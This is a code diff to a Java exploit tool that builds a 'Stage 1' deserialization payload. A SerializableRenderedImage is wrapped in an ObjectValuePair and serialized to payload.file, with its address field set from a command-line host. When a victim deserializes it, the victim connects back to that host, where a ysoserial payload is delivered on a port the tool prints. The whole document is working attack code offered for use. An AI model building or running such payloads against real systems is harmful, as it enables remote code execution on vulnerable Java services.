@@ -55,20 +55,24 @@ public class App
 	}
     public static void main ( String[] args )
     {
+    	if (args.length < 1){
+    		System.out.println("java -jar [this jar] [Host IP]");
+    		System.exit(0);
+    	}
         // Create a serializable image
     	BufferedImage image = new BufferedImage(1,1,BufferedImage.TYPE_BYTE_BINARY);
     	SerializableRenderedImage simage = new SerializableRenderedImage(image);
-    	String path = "C:\\Users\\admin\\Downloads\\payload.file";
-    	//Desired port
-    	String port = "1337";
+    	//Wrap the object into the ObjectValuePair in order to avoid the exception
+    	ObjectValuePair<SerializableRenderedImage,Object> payload = new ObjectValuePair<SerializableRenderedImage,Object>(simage,null);
+    	String path = "./payload.file";
     	//Desired host
-    	String host = "127.0.0.1";
+    	String host = args[0];
     	InetAddress ip = null;
     	String hostXml;
     	Document hostDoc;
     	// Convert to xml
     	XStream xstream = new XStream();
-    	String payloadXml = xstream.toXML(simage);
+    	String payloadXml = xstream.toXML(payload);
     	Document payloadDoc;
     	try{
     		ip = InetAddress.getByName(host);
@@ -86,23 +90,25 @@ public class App
         	Element addressField = (Element)hostDoc.getElementsByTagName("address").item(0);
         	String address = addressField.getTextContent();
         	
-        	//Assign the fields the right value
+        	//Assign the host field the right value
         	payloadDoc.getDocumentElement().normalize();
-        	Element portElement = (Element) payloadDoc.getElementsByTagName("port").item(0);
-        	portElement.setTextContent(port);
+        	
         	Element addressElement = (Element) payloadDoc.getElementsByTagName("address").item(0);
         	addressElement.setTextContent(address);
-        	System.out.println(toString(payloadDoc));
-        	System.out.println("<---------------------->");
+        	//Element portElement = (Element) payloadDoc.getElementsByTagName("port").item(0);
+        	//portElement.setTextContent(port);
+        	
+        	//System.out.println(toString(payloadDoc));
+        	//System.out.println("<---------------------->");
+        	
         	//Rebuild object from XML
-        	simage = (SerializableRenderedImage) xstream.fromXML(toString(payloadDoc));
-        	//Wrap the object into the ObjectValuePair in order to avoid the exception
-        	ObjectValuePair<SerializableRenderedImage,Object> payload = new ObjectValuePair<SerializableRenderedImage,Object>(simage,null);
+        	payload = (ObjectValuePair<SerializableRenderedImage,Object>) xstream.fromXML(toString(payloadDoc));
         	
-        	
+        	//Ouput randomly chosen port
         	payloadXml = xstream.toXML(payload);       	
         	payloadDoc = loadXMLFromString(payloadXml);
-        	System.out.println(toString(payloadDoc));
+        	Element portElement = (Element) payloadDoc.getElementsByTagName("port").item(0);
+        	System.out.println("Port to deliver ysoserial payload: "+portElement.getTextContent());
 
         	//Serialize the object and write to a file
         	FileOutputStream fos = new FileOutputStream(path);
@@ -110,7 +116,7 @@ public class App
         	out.writeObject(payload);
         	out.close();
         	fos.close();
-        	System.out.printf("Stage 1 payload written to %s", path);
+        	System.out.printf("Stage 1 payload written to %s\n", path);
         	
     	}catch(Exception e){
     		//This won't ever happen since it connects back
